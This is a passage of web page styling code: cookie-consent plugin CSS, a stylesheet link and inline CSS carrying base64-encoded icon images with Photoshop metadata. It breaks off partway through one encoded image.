.moove-gdpr-modal-close span.gdpr-icon:hover,#moove_gdpr_cookie_info_bar span[data-href]>u.change-settings-button{color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li.menu-item-selected a span.gdpr-icon,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li.menu-item-selected button span.gdpr-icon{color:inherit}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li a span.gdpr-icon,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li button span.gdpr-icon{color:inherit}#moove_gdpr_cookie_modal .gdpr-acc-link{line-height:0;font-size:0;color:transparent;position:absolute}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close:hover i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li a,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li button,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li button i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li a i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-tab-main .moove-gdpr-tab-main-content a:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a.mgbutton:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.mgbutton:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content span.change-settings-button:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.change-settings-button:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content u.change-settings-button:hover,#moove_gdpr_cookie_info_bar span[data-href]>u.change-settings-button,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a.mgbutton.focus-g,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.mgbutton.focus-g,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a.focus-g,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.focus-g,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a.mgbutton:focus,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.mgbutton:focus,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a:focus,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button:focus,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content span.change-settings-button.focus-g,span.change-settings-button:focus,button.change-settings-button.focus-g,button.change-settings-button:focus,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content u.change-settings-button.focus-g,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content u.change-settings-button:focus{color:#0c4da2}#moove_gdpr_cookie_modal.gdpr_lightbox-hide{display:none}
</style>
<link rel="stylesheet" id="stbCoreCSS-css" href="https://www.corelan.be/wp-content/plugins/wp-special-textboxes/css/stb-core.css?ver=6.2.2" type="text/css" media="all">
<style id="stbCoreCSS-inline-css" type="text/css">
.stb-container {border-radius: 5px;-webkit-box-shadow: 0px 0px 15px #555555;box-shadow: 0px 0px 15px #555555;margin: 10px 10px 10px 10px}.stb-container.stb-widget {margin-left: 0;margin-right: 0;box-shadow: none}.stb-container .stb-caption .stb-caption-content {font-size: 15px;font-family: Impact, Verdana, Helvetica, Arial, sans-serif}.stb-container .stb-caption .stb-tool {background-color: transparent;background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAKZJREFUeNrskr0NwjAQhZ9NaJmALbwIUwSJRdgAiTIVa2QBKNNQU1BSWPIPtnl2FERJ5DaWPp9cfE93OouUEmqOROVZAoDmIgQEcCZqjsjdXcm+MeNb7dpWaa3hnCt47wsxRuRVTzUjpcTQ92MHR14HYq2FMabUKSCE8JV+Eez6ReeUA+7A9gYMz66bNfuDTnY5OjY5iKzJ6k8/EE/eYvnK9QEfAQYA6/9arWk/ykwAAAAASUVORK5CYII=);background-position: 50%;background-repeat: no-repeat}.stb-container .stb-content {padding: 10px;font-size: unset;font-family: unset;text-shadow: unset}.stb-container.stb-collapsed .stb-caption .stb-tool {background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAA4GmlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS41LWMwMTQgNzkuMTUxNDgxLCAyMDEzLzAzLzEzLTEyOjA5OjE1ICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIKICAgICAgICAgICAgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIgogICAgICAgICAgICB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIKICAgICAgICAgICAgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmV4aWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vZXhpZi8xLjAvIj4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBQaG90b3Nob3AgQ0MgKFdpbmRvd3MpPC94bXA6Q3JlYXRvclRvb2w+CiAgICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDE0LTAxLTI4VDExOjI3OjE1KzAzOjAwPC94bXA6Q3JlYXRlRGF0ZT4KICAgICAgICAgPHhtcDpNb2RpZnlEYXRlPjIwMTQtMDItMDRUMTc6MzQ6MTErMDM6MDA8L3htcDpNb2RpZnlEYXRlPgogICAgICAgICA8eG1wOk1ldGFkYXRhRGF0ZT4yMDE0LTAyLTA0VDE3OjM0OjExKzAzOjAwPC94bXA6TWV0YWRhdGFEYXRlPgogICAgICAgICA8ZGM6Zm9ybWF0PmltYWdlL3BuZzwvZGM6Zm9ybWF0PgogICAgICAgICA8cGhvdG9zaG9wOkNvbG9yTW9kZT4zPC9waG90b3Nob3A6Q29sb3JNb2RlPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD54bXAuaWlkOjdjYTIzOWYyLTY1OWYtZjk0Ny04YmU0LTcyNWMxZTg3YjA1ZDwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAgPHhtcE1NOkRvY3VtZW50SUQ+eG1wLmRpZDo3Y2EyMzlmMi02NTlmLWY5NDctOGJlNC03MjVjMWU4N2IwNWQ8L3htcE1NOkRvY3VtZW50SUQ+CiAgICAgICAgIDx4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ+eG1wLmRpZDo3Y2EyMzlmMi02NTlmLWY5NDctOGJlNC03MjVjMWU4N2IwNWQ8L3htcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOkhpc3Rvcnk+CiAgICAgICAgICAgIDxyZGY6U2VxPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5jcmVhdGVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6N2NhMjM5ZjItNjU5Zi1mOTQ3LThiZTQtNzI1YzFlODdiMDVkPC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDE0LTAxLTI4VDExOjI3OjE1KzAzOjAwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBQaG90b3Nob3AgQ0MgKFdpbmRvd3MpPC9zdEV2dDpzb2Z0d2FyZUFnZW50PgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgPC9yZGY6U2VxPgogICAgICAgICA8L3htcE1NOkhpc3Rvcnk+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgICAgIDx0aWZmOlhSZXNvbHV0aW9uPjcyMDAwMC8xMDAwMDwvdGlmZjpYUmVzb2x1dGlvbj4KICAgICAgICAgPHRpZmY6WVJlc29sdXRpb24+NzIwMDAwLzEwMDAwPC90aWZmOllSZXNvbHV0aW9uPgogICAgICAgICA8dGlmZjpSZXNvbHV0aW9uVW5pdD4yPC90aWZmOlJlc29sdXRpb25Vbml0PgogICAgICAgICA8ZXhpZjpDb2xvclNwYWNlPjY1NTM1PC9leGlmOkNvbG9yU3BhY2U+CiAgICAgICAgIDxleGlmOlBpeGVsWERpbWVuc2lvbj4xNjwvZXhpZjpQaXhlbFhEaW1lbnNpb24+CiAgICAgICAgIDxleGlmOlBpeGVsWURpbWVuc2lvbj4xNjwvZXhpZjpQaXhlbFlEaW1lbnNpb24+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIC